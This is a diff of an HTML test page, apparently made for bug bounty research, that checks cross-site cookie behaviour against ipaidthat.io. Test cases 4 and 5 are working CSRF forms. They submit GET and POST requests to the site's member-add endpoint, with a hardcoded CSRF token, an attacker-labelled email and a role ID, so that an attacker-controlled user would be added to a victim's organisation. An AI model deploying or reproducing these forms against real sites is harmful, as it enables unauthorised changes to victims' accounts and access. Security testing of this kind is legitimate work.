@@ -1,29 +1,44 @@
 <HTML>
 <HEAD>
-    <Title> TEST - Cross Site sending cookies </Title>
+    <Title> TEST - Cross Site sending cookies behaviour </Title>
 </HEAD>
 <BODY>
-    <H1> Image </H1>
+    <H1> Testing Cross Site cookie sending behaviour </H1>
+
     <br><hr><br>
+
+    <H2> TEST CASE 1: Cross Site image insertion </H2>
     <img src="https://ipaidthat.io/static/img/ipt_logo_black.png" height="25">
-    <H1> Link </H1>
-    <a href="https://ipaidthat.io/dashboard"> Click Here </a>
+
     <br><hr><br>
-    <H1> Form GET request </H1>
+
+    <H2> TEST CASE 2: Cross Site Hyperlink </H2>
+    <a href="https://ipaidthat.io/dashboard#Link"> Click Here </a>
+
+    <br><hr><br>
+
+    <H2> TEST CASE 3: Cross Site Iframe </H2>
+    <iframe src="https://ipaidthat.io/dashboard#Iframe" title="TEST CASE 3: Cross Site Iframe"></iframe>
+
+    <H2> TEST CASE 4: Form with Cross Site GET request </H2>
     <form action="https://ipaidthat.io/ajax/organisation/members/add" method="GET" name="csrf_form">
       <input type="text" name="csrfmiddlewaretoken" value="DwHzq1JFsJIsHmSDEcxEESi0yOav8j4zJvXd6IRimCa11q12HXEThyKDGpaiGy5r" />
       <input type="text" name="email" value="nnamidc-I22006A01_ATACKER01@intigriti.me" />
       <input type="text" name="role" value="109870" />
       <input type="submit" value="submit" />
     </form>
+
     <br><hr><br>
-    <H1> Form POST request </H1>
+
+    <H2> TEST CASE 5: Form with Cross Site POST request </H2>
     <form action="https://ipaidthat.io/ajax/organisation/members/add" method="POST" name="csrf_form">
       <input type="text" name="csrfmiddlewaretoken" value="DwHzq1JFsJIsHmSDEcxEESi0yOav8j4zJvXd6IRimCa11q12HXEThyKDGpaiGy5r" />
       <input type="text" name="email" value="nnamidc-I22006A01_ATACKER01@intigriti.me" />
       <input type="text" name="role" value="109870" />
       <input type="submit" value="submit" />
     </form>
+
     <br><hr><br>
+
 </BODY>
 </HTML>
